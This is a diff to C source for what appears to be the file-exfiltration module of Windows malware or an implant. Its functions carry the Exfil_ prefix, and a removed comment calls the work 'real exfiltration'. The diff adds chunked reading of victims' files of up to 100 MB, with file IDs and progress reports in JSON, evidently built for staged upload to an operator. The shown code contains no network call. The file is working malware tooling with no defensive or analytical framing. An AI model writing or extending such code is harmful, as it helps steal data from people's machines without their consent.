@@ -38,8 +38,10 @@ static const char* SENSITIVE_KEYWORDS[] = {
     NULL
 };
 
-// Taille max pour recherche dans contenu
+// Size limits
 #define MAX_CONTENT_SEARCH_SIZE (10 * 1024 * 1024)  // 10 MB
+#define CHUNK_SIZE              (1024 * 1024)        // 1 MB chunks
+#define MAX_FILE_SIZE           (100 * 1024 * 1024)  // 100 MB max
 
 /* Helpers */
 
@@ -241,8 +243,7 @@ BOOL Exfil_SearchFiles(const char* startPath, BOOL byExtension, BOOL byKeyword,
 }
 
 /*
- * Lit un fichier et retourne son contenu.
- * Pour l'exfiltration réelle.
+ * Read entire file (for small files < 10MB)
  */
 BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
     if (!filePath || !outData || !outSize) return FALSE;
@@ -259,7 +260,7 @@ BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
         return FALSE;
     }
 
-    // Limite de taille pour éviter les fichiers énormes
+    // Size limit for single read
     if (fileSize > MAX_CONTENT_SEARCH_SIZE) {
         CloseHandle(hFile);
         return FALSE;
@@ -281,5 +282,214 @@ BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
 
     *outSize = fileSize;
     CloseHandle(hFile);
+    return TRUE;
+}
+
+/* Chunked file info */
+typedef struct {
+    char filePath[MAX_PATH];
+    char fileId[64];
+    DWORD64 totalSize;
+    DWORD totalChunks;
+    DWORD currentChunk;
+    HANDLE hFile;
+} ChunkedFileContext;
+
+static ChunkedFileContext g_chunkedCtx = {0};
+
+/*
+ * Get file info for chunked upload
+ * Returns JSON with file_id, total_size, total_chunks
+ */
+BOOL Exfil_GetFileInfo(const char* filePath, char** outJson) {
+    if (!filePath || !outJson) return FALSE;
+    *outJson = NULL;
+    
+    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, 
+                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize)) {
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    CloseHandle(hFile);
+    
+    if (fileSize.QuadPart > MAX_FILE_SIZE) {
+        return FALSE;  // File too large
+    }
+    
+    DWORD totalChunks = (DWORD)((fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
+    
+    // Generate file ID based on path and timestamp
+    char fileId[64];
+    snprintf(fileId, sizeof(fileId), "file_%08x_%lu", 
+             (unsigned int)(fileSize.QuadPart ^ GetTickCount()), GetCurrentProcessId());
+    
+    char* json = (char*)malloc(1024);
+    if (!json) return FALSE;
+    
+    // Escape path for JSON
+    char escapedPath[MAX_PATH * 2];
+    int j = 0;
+    for (const char* p = filePath; *p && j < sizeof(escapedPath) - 2; p++) {
+        if (*p == '\\') {
+            escapedPath[j++] = '\\';
+            escapedPath[j++] = '\\';
+        } else {
+            escapedPath[j++] = *p;
+        }
+    }
+    escapedPath[j] = '\0';
+    
+    snprintf(json, 1024,
+        "{\n"
+        "  \"file_id\": \"%s\",\n"
+        "  \"file_path\": \"%s\",\n"
+        "  \"total_size\": %llu,\n"
+        "  \"chunk_size\": %d,\n"
+        "  \"total_chunks\": %lu\n"
+        "}",
+        fileId, escapedPath, (unsigned long long)fileSize.QuadPart, CHUNK_SIZE, totalChunks);
+    
+    *outJson = json;
+    return TRUE;
+}
+
+/*
+ * Start chunked file read
+ * Opens file and initializes context
+ */
+BOOL Exfil_StartChunkedRead(const char* filePath, char* fileIdOut, DWORD fileIdSize) {
+    if (!filePath || !fileIdOut) return FALSE;
+    
+    // Close any existing context
+    if (g_chunkedCtx.hFile != NULL && g_chunkedCtx.hFile != INVALID_HANDLE_VALUE) {
+        CloseHandle(g_chunkedCtx.hFile);
+    }
+    memset(&g_chunkedCtx, 0, sizeof(g_chunkedCtx));
+    
+    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, 
+                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize)) {
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    if (fileSize.QuadPart > MAX_FILE_SIZE) {
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    // Setup context
+    strncpy(g_chunkedCtx.filePath, filePath, MAX_PATH - 1);
+    snprintf(g_chunkedCtx.fileId, sizeof(g_chunkedCtx.fileId), "file_%08x_%lu",
+             (unsigned int)(fileSize.QuadPart ^ GetTickCount()), GetCurrentProcessId());
+    g_chunkedCtx.totalSize = fileSize.QuadPart;
+    g_chunkedCtx.totalChunks = (DWORD)((fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
+    g_chunkedCtx.currentChunk = 0;
+    g_chunkedCtx.hFile = hFile;
+    
+    strncpy(fileIdOut, g_chunkedCtx.fileId, fileIdSize - 1);
+    return TRUE;
+}
+
+/*
+ * Read next chunk
+ * Returns FALSE when done (no more chunks)
+ */
+BOOL Exfil_ReadNextChunk(BYTE** outData, DWORD* outSize, DWORD* chunkIndex, DWORD* totalChunks) {
+    if (!outData || !outSize || !chunkIndex || !totalChunks) return FALSE;
+    *outData = NULL;
+    *outSize = 0;
+    
+    if (g_chunkedCtx.hFile == NULL || g_chunkedCtx.hFile == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+    
+    if (g_chunkedCtx.currentChunk >= g_chunkedCtx.totalChunks) {
+        // Done - close file
+        CloseHandle(g_chunkedCtx.hFile);
+        g_chunkedCtx.hFile = NULL;
+        return FALSE;
+    }
+    
+    // Calculate chunk size (last chunk may be smaller)
+    DWORD64 offset = (DWORD64)g_chunkedCtx.currentChunk * CHUNK_SIZE;
+    DWORD64 remaining = g_chunkedCtx.totalSize - offset;
+    DWORD toRead = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)remaining;
+    
+    // Allocate buffer
+    *outData = (BYTE*)malloc(toRead);
+    if (!*outData) return FALSE;
+    
+    // Seek and read
+    LARGE_INTEGER seekPos;
+    seekPos.QuadPart = offset;
+    if (!SetFilePointerEx(g_chunkedCtx.hFile, seekPos, NULL, FILE_BEGIN)) {
+        free(*outData);
+        *outData = NULL;
+        return FALSE;
+    }
+    
+    DWORD bytesRead;
+    if (!ReadFile(g_chunkedCtx.hFile, *outData, toRead, &bytesRead, NULL) || bytesRead != toRead) {
+        free(*outData);
+        *outData = NULL;
+        return FALSE;
+    }
+    
+    *outSize = toRead;
+    *chunkIndex = g_chunkedCtx.currentChunk;
+    *totalChunks = g_chunkedCtx.totalChunks;
+    
+    g_chunkedCtx.currentChunk++;
+    
+    return TRUE;
+}
+
+/*
+ * Cancel chunked read
+ */
+void Exfil_CancelChunkedRead(void) {
+    if (g_chunkedCtx.hFile != NULL && g_chunkedCtx.hFile != INVALID_HANDLE_VALUE) {
+        CloseHandle(g_chunkedCtx.hFile);
+    }
+    memset(&g_chunkedCtx, 0, sizeof(g_chunkedCtx));
+}
+
+/*
+ * Get current chunked read state
+ */
+BOOL Exfil_GetChunkedReadState(char** outJson) {
+    if (!outJson) return FALSE;
+    
+    char* json = (char*)malloc(512);
+    if (!json) return FALSE;
+    
+    if (g_chunkedCtx.hFile == NULL || g_chunkedCtx.hFile == INVALID_HANDLE_VALUE) {
+        snprintf(json, 512, "{\"active\": false}");
+    } else {
+        snprintf(json, 512,
+            "{\n"
+            "  \"active\": true,\n"
+            "  \"file_id\": \"%s\",\n"
+            "  \"current_chunk\": %lu,\n"
+            "  \"total_chunks\": %lu,\n"
+            "  \"progress_pct\": %d\n"
+            "}",
+            g_chunkedCtx.fileId,
+            g_chunkedCtx.currentChunk,
+            g_chunkedCtx.totalChunks,
+            g_chunkedCtx.totalChunks > 0 ? 
+                (int)(g_chunkedCtx.currentChunk * 100 / g_chunkedCtx.totalChunks) : 0);
+    }
+    
+    *outJson = json;
     return TRUE;
 }
